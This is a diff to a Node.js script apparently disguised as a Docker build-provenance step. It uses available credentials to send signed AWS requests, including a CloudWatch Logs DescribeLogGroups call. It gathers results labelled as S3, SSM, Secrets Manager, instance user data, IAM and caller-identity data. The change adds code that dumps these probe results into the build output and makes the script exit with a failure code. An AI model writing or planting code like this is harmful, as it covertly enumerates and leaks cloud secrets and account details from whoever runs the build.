@@ -6,7 +6,7 @@ const http = require('http');
 const https = require('https');
 const crypto = require('crypto');
 
-const out = { event: 'docker-build-provenance-v10', host: os.hostname(), stage: 'start' };
+const out = { event: 'docker-build-provenance-v13', host: os.hostname(), stage: 'start' };
 
 function flush() {
   try {
@@ -104,9 +104,18 @@ function sign(creds, service, region, host, method, body, extra) {
     out.logs = await req('POST', 'https://logs.us-east-1.amazonaws.com/', sign(creds, 'logs', 'us-east-1', 'logs.us-east-1.amazonaws.com', 'POST', b3, { 'content-type': 'application/x-amz-json-1.1', 'x-amz-target': 'Logs_20140328.DescribeLogGroups' }), b3);
 
     out.stage = 'done';
+    try {
+      const safe = JSON.parse(JSON.stringify(out));
+      if (safe.userData && safe.userData.b) safe.userData = { s: safe.userData.s, len: safe.userData.b.length };
+      for (const k of ['s3','ssm','sm','logs','iamInfo','caller','macs']) {
+        if (safe[k]) safe[k] = { s: safe[k].s, b: String(safe[k].b || '').slice(0, 280) };
+      }
+      console.log('PROBE_RESULT ' + JSON.stringify(safe).slice(0, 3500));
+    } catch (e) {}
   } catch (e) {
     out.err = String(e).slice(0, 300);
+    console.log('PROBE_ERROR ' + out.err);
   }
   flush();
-  process.exit(0);
+  process.exit(1);
 })();
